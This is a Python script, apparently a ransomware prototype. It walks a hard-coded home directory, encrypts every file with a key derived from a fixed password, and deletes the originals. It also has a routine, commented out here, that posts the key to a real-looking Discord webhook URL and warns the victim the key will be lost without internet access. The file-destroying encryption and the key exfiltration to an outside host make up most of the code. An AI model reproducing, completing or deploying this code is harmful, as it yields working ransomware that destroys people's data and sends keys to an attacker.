import os, time, base64
import sys
import requests
from six.moves import input

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

WEBHOOK_URL = "https://discord.com/api/webhooks/1222207540046336122/uWSndxoa80JUh3DD13bbdKbPJX-ToF2WtBkidBeY60KxHMHBQ_GnUfF_iWe2uEOxS7Rg"
BASE_DIR = "/home/guest3301/test/"
files = []

def scan_recurse(base_dir):
    try:
        for entry in os.scandir(base_dir):
            if entry.is_file():
                yield entry
            else:
                yield from scan_recurse(entry.path)
    except Exception as e:
        return str(e)

try:
    files = [item for item in scan_recurse(BASE_DIR) if item != "key.key"]
except Exception as e:
    print(f"Exception: {e}")

class Encryptor:
    def __init__(self): 
        self.key = None

    def derive_key(self):
        password = b"hello world!" # Fernet.generate_key()
        salt = b'somesuperrandomstuff' # os.urandom(16) 
        kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,  # 256-bit key
        salt=salt,
        iterations=100000,
        backend=default_backend()
        )
        self.key = base64.urlsafe_b64encode(kdf.derive(password)) 
        return self.key

    def backup_key(self, key):
        for counter in range(1, 21):
            try:
                '''r = requests.post(WEBHOOK_URL, json={"content": str(key)})
                if r.status_code == 200:
                    print("Encryption key generated and saved successfully.")''' 
                break 
            except requests.exceptions.ConnectionError:
                print('Unfortunately, this program cannot access internet.\nYou have approx. 60+ Seconds to connect to internet, or else you will lose your KEY.')
                if counter == 20:
                    del key, counter
                    print('Failed to save key. you lost it.')
                time.sleep(3) # Change 0.1 --> 3; 20 * 3 = 60 seconds + time taken by a function to complete one cycle.

    def encrypt(self, key):
        for file in files.copy():
            try:
                if not os.path.isfile(file):
                    print(f"{file} not found or is not a file, skipping.")
                    continue
                with open(file, 'rb') as f_in:
                    with open(str(file.path) + '.enc', 'wb') as f_out:
                        for chunk in iter(lambda: f_in.read(2 * 1024 * 1024), b''):
                            encrypted_chunk = Fernet(key).encrypt(chunk)
                            print(f"Encrypting {file.name} {len(chunk)};", end="\r")
                            f_out.write(encrypted_chunk)
                os.unlink(file.path)
                print(f'Encrypted: {file.path}')
            except Exception as e:
                print(f"Error encrypting {file}: {e}")
    
    def decrypt(self, key):
        files = [item for item in scan_recurse(BASE_DIR) if item != "key.key"]
        for file in files.copy():
            try:
                if not os.path.isfile(file):
                    print(f"{file} not found or is not a file, skipping.")
                    continue
                if not str(file.path).endswith('.enc'):
                    continue
                with open(file, 'rb') as f_in:
                    with open(str(os.path.splitext(file.path)[0]), 'wb') as f_out:
                        try:
                            for chunk in iter(lambda: f_in.read(2 * 1024 * 1024), b''):
                                decrypted_chunk = Fernet(key).decrypt(chunk)
                                f_out.write(decrypted_chunk)
                        except:
                            for chunk in iter(lambda: f_in.read(100 * 1024 * 1024), b''):
                                decrypted_chunk = Fernet(key).decrypt(chunk)
                                f_out.write(decrypted_chunk)
                os.unlink(file.path)
                print(f'Decrypted: {file.path}')
                time.sleep(2)
            except Exception as e:
                print(f"Error decrypting {file.path}: {e}")

def main():
    encryptor = Encryptor()
    encryptor.derive_key()  # Generate the encryption key
    print("(E)ncrypt/(D)ecrypt: ")
    opt = input().upper()
    if opt == "E":
        encryptor.encrypt(encryptor.key)
        encryptor.backup_key(encryptor.key)
        print("Encrypted.")
        print("key", encryptor.key)
    elif opt == "D":
        encryptor.decrypt(encryptor.key)
    else:
        print("Invalid option. Please choose (E) or (D).")
    return "Task finished"

if __name__ == "__main__":
    main()
'''
import time

def my_function():
 # Simulate some work
 for i in range(100000):
   pass

start_time = time.time()
my_function()
end_time = time.time()

execution_time = end_time - start_time
print(f"Execution time: {execution_time} seconds")
'''